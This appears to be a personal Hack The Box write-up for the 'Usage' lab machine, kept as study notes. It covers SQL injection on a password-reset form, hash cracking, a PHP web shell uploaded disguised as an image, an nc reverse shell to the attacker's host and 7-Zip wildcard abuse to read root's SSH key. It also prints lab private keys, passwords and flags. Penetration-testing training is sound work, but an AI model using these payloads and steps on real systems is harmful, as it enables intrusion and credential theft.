## Intro

tags: #linux #OSCPpath #SQL-injection #FileUpload #Decompile #codereview #3rd-party-vuln-app #easy

------
## Logging

- logs only current terminal
- type `exit` or press `Ctrl+D` to stop and save the file
- - to stop and save the file. You can replay it later using [scriptreplay](https://www.keuperict.nl/posts/security/2019/11/20/logging-terminal-session/)
```shell
script -t=timing.log usage.log
```
ctrl+d should show this output:
```shell
exit
Script done.
```
now replay it as video on your terminal
```shell
scriptreplay -t timing.log usage.log
```
if sth strange happens and did not happen to execute ctrl+d then
```shell
echo $SCRIPT
```
- If it outputs a path to a file (like `/home/kali/typescript`), **you are still recording**.
- If it returns a blank line, **you are not recording**.
- even if i close terminal the output will be saved

-> clean log for reporting, its now plaintext as shown on terminal
```shell
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" bashed.log > bashed_report.txt
```

----
# Reconnaissance

```shell
source basher target1 10.129.68.227 [IP]
source basher host1 usage.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-12 04:56 -0400
Nmap scan report for 10.129.68.227
Host is up (0.10s latency).                                                              
Not shown: 59595 closed tcp ports (reset), 5938 filtered tcp ports (no-response)               
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                                                                           
PORT   STATE SERVICE                                                                  
22/tcp open  ssh 
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.50 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p80,22 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-12 04:58 -0400
Nmap scan report for usage.htb (10.129.68.227)
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Daily Blogs
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   53.02 ms 10.10.14.1
2   53.26 ms usage.htb (10.129.68.227)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

![](MediaFiles/Pasted%20image%2020260912115911.png)
the admin page goes to `http://admin.usage.htb`
 added it to etc hosts and then navigated
![](MediaFiles/Pasted%20image%2020260912123002.png)

register a user and then login
![](MediaFiles/Pasted%20image%2020260912120018.png)

also found reset password
![](MediaFiles/Pasted%20image%2020260912121609.png)


### Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```
nothing here

### Subdomains

```shell
gobuster dns --domain $target1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
nothing here

### Vhosts enumeration

```shell
curl -s http://$target1 | wc -c
14175
```

```shell
gobuster vhost -u http://$target1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 14175 -t 50
```
nothing here

-----
# Foothold
## SQLi

since nothing further obvious found, lets try sqli on forgot password, since it did not work on the `login` form
![](MediaFiles/Pasted%20image%2020260912121753.png)
![](MediaFiles/Pasted%20image%2020260912121805.png)
```shell
admin'--
' OR 1=1--
```
gives 500 server error that means sqli is verified to work!
Bingo, an error likely means the SQL statement was made invalid by our input, indicating SQLI

https://tib3rius.com/sqli.html

```
' OR 1=1--
' OR ROWNUM = '1
' OR ROWID = '1
AND LENGTHB('foo') = '3'
AND GLOB('foo*', 'foobar') = 1
```
![](MediaFiles/Pasted%20image%2020260912121920.png)
via burp i see that the response shows 302 Found, that means sqli is verified to work! but for this one, no output is leaked

![](MediaFiles/Pasted%20image%2020260912125552.png)

```shell
sqlmap -r req.txt -p 'email' --batch --risk 3 --level 5
```

```shell
POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 740 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: _token=dYO4vOgTHvWuFtokXlGhVLHXriYp8kYB1Yo8j2dB&email=' AND 8285=(SELECT (CASE WHEN (8285=8285) THEN 8285 ELSE (SELECT 6149 UNION SELECT 2422) END))-- WnyW

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: _token=dYO4vOgTHvWuFtokXlGhVLHXriYp8kYB1Yo8j2dB&email=' AND 4736=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- gecx
---
[12:10:39] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL > 5.0.12
```
I will re-run the sqlmap command again but with two appended parameters:

- `--dump` = Dump the Database table entries
- `-dmbs MySQL` = Specify the DBMS system in use SQLMap will utilize the information from the previously conducted scan to expedite the process and skip right to dumping the DB’s contents.
```shell
sqlmap -r req.txt -p 'email' --batch --risk 3 --level 5 --dump
```
![](MediaFiles/Pasted%20image%2020260912125911.png)
SQLMap identified the `usage_blog` database and the `admin_users` table so I will cancel the current sqlmap command and append the folllowing commands to expedite the enumeration process again:

- `-D usage_blog` = Specify database to enumerate
- `-T admin_users` = Designate table to dump entries from

From the above SQLMap commands we have gathered the following information:
```shell
[12:50:03] [INFO] retrieved: id
[12:50:11] [INFO] retrieved: username
[12:50:41] [INFO] retrieved: password
[12:51:14] [INFO] retrieved: name
[12:51:29] [INFO] retrieved: avatar
[12:51:50] [INFO] retrieved: remember_token
[12:52:37] [INFO] retrieved: created_at
[12:53:14] [INFO] retrieved: updated_at
[12:53:58] [INFO] fetching entries for table 'admin_users' in database 'usage_blog'
[12:53:58] [INFO] fetching number of entries for table 'admin_users' in database 'usage_blog'
[12:53:58] [INFO] retrieved: 1
[12:54:00] [INFO] retrieved: Administrator
[12:54:47] [INFO] retrieved: 
[12:55:22] [INFO] retrieved: 2023-08-13 02:48:26
[12:56:39] [INFO] retrieved: 1
[12:56:42] [INFO] retrieved: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
[13:01:18] [INFO] retrieved: kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT
[13:06:00] [INFO] retrieved: 2023-08-23 06:02:19
[13:07:25] [INFO] retrieved: admin
```

#### hash obtained

```
admin
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
```

## Hash cracking

```shell
echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash
```

```shell
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
cracked
```shellshell
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
                                                          
Session..........: hashcat
Status...........: Cracked
```

#### creds obtained

```
admin
whatever1
```

## Admin panel login

lets login with those
![](MediaFiles/Pasted%20image%2020260912130604.png)
useful info here, regarding versions so lets check them for vulnerabilities
### Vulnerable version
```shell
─$ searchsploit laravel 10                                                                                                                                     
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Aimeos Laravel ecommerce platform 2021.10 LTS - 'sort' SQL injection                                                                | php/webapps/50538.txt
Laravel Administrator 4 - Unrestricted File Upload (Authenticated)                                                                  | php/webapps/49112.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(ch3ckm8㉿kali)-[~/HTB/usage]
└─$ searchsploit -m 49112.py
  Exploit: Laravel Administrator 4 - Unrestricted File Upload (Authenticated)
      URL: https://www.exploit-db.com/exploits/49112
     Path: /usr/share/exploitdb/exploits/php/webapps/49112.py
    Codes: CVE-2020-10963
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/ch3ckm8/HTB/usage/49112.py

```

## File upload
but before executing it, we can also do it via file upload manually
![](MediaFiles/Pasted%20image%2020260912131407.png)
but just uploading it wont do the thing, rename it to .jpg
uploaded it, but where did it go?

```shell
echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIW2P8z8BQDwAE/wH+O+kO1gAAAABJRU5ErkJggg==" | base64 -d > shell.png

cho "<?php system(\$_GET['cmd']); ?>" >> shell.png
```

upload and interecept and repat with burp by changing the filename and appending `.php`
![](MediaFiles/Pasted%20image%2020260912134149.png)
![](MediaFiles/Pasted%20image%2020260912134146.png)
rev shell, execute this
```shell
busybox nc 10.10.14.247 4444 -e sh
```
## Shell as dash

grab user flag and grab private key to login via ssh
```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.68.227] 35336
python3 -c 'import pty; pty.spawn("/bin/bash")'
dash@usage:/var/www/html/project_admin/public/uploads/images$ ls
ls
dash@usage:/var/www/html/project_admin/public/uploads/images$ cd
cd
dash@usage:~$ ls
ls
user.txt
dash@usage:~$ cat user.txt
cat user.txt
e49d32e5f4d6a6a52fad736c0e1e9357
dash@usage:~$ whoami
whoami
dash
```
### persistence
```shell
dash@usage:~$ cat /home/dash/.ssh/id_rsa
cat /home/dash/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
-----END OPENSSH PRIVATE KEY-----

```

```shell
ssh -i key dash@usage.htb
```

-----
# Privesc

## user enumeration

```shell
dash@usage:~$ cat /etc/passwd | grep bin/bash
root:x:0:0:root:/root:/bin/bash
dash:x:1000:1000:dash:/home/dash:/bin/bash
xander:x:1001:1001::/home/xander:/bin/bash
```
okay so there is one more user there that is non root (xander) andn we might need to get access there

## filesystem enum

```shell
dash@usage:~$ ls -la
total 52
drwxr-x--- 6 dash dash 4096 Sep 12 10:52 .
drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
drwx------ 3 dash dash 4096 Aug  7  2023 .cache
drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
-rw-r--r-- 1 dash dash    5 Sep 12 10:52 .monit.pid
-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
-rw------- 1 dash dash 1192 Sep 12 10:50 .monit.state
-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
-rw-r----- 1 root dash   33 Sep 12 08:54 user.txt
dash@usage:~$ cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
```
in this snippet, found creds!
```shell
#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```
lets see if those apply to the other user
#### creds obtained
```
3nc0d3d_pa$$w0rd
```

## Shell as xander

lets see if those apply to the other user
```shell
dash@usage:~$ su - xander
Password: 
xander@usage:~$ 
```
it works! password reuse all over again

## sudo -l

```shell
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

### Custom binary
lets run it
```shell
xander@usage:~$ sudo /usr/bin/usage_management
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
```
lets choose option 1
```shell
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 1

7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)

Scanning the drive:
2984 folders, 17953 files, 113880134 bytes (109 MiB)

Creating archive: /var/backups/project.zip

Items to compress: 20937

                                                                               
Files read from disk: 17953
Archive size: 54832884 bytes (53 MiB)
Everything is Ok
```
but cant view them... hmm we need to understand how the binary works

### Decompile

lets transfer it to our host first
```shell
scp xander@usage.htb:/usr/bin/usage_management .
```

use dogbolt decompiler
```c#
void backupWebContent()
{
    char v0;  // [bp-0x8]
    unsigned long long v2;  // rbp

    v2 = &v0;
    if (chdir("/var/www/html"))
    {
        perror("Error changing working directory to /var/www/html");
        return;
    }
    system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
    return;
}

void backupMysqlData()
{
    char v0;  // [bp-0x8]
    unsigned long long v2;  // rbp

    v2 = &v0;
    system("/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql");
    return;
}

void resetAdminPassword()
{
    char v0;  // [bp-0x8]
    unsigned long long v2;  // rbp

    v2 = &v0;
    puts("Password has been reset.");
    return;
}
```

## 3rd party app usage found

we see that it executes this
```shell
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```
what caught my attention here was the usage of wildcard `*`

### Exploiting 7zip

Found this regarding 7zip and wildcards:
https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z

Use the following steps in order exploit the 7z command being ran through the `usage_management` binary:

1. Change to the `/var/www/html` Directory

Using the source code from DogBolt we know that the binary is archiving all files within the `/var/www/html` directory. Navigate to this directory && check the permissions:

_/var/www/html Directory Permissions_

In this case the `xander` group is able to RWX over the directory.

Read the Root user’s Private SSH Key on your home dir:
```shell
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
mv * /var/www/html
```

```shell
sudo /usr/bin/usage_management
```
since it contained errors in the output, trim it and place it as it should:
```shell
-----BEGIN OPENSSH PRIVATE KEY----- : No more files
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
-----END OPENSSH PRIVATE KEY----- : No more files
----------------
```
to
```shell
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

## Shell as root
```shell
ssh -i root-key root@usage.htb
```

```shell
└─$ ssh -i id_rsa root@usage.htb                                                                                                                                      
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Sep 12 11:12:06 AM UTC 2026

  System load:           0.046875
  Usage of /:            66.5% of 6.53GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.129.68.227
  IPv6 address for eth0: dead:beef::a0de:adff:fe7f:9a1b


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
root@usage:~# cat root.txt
dcc3d53dccfd67327d19c90e5592b5b7
root@usage:~# 
```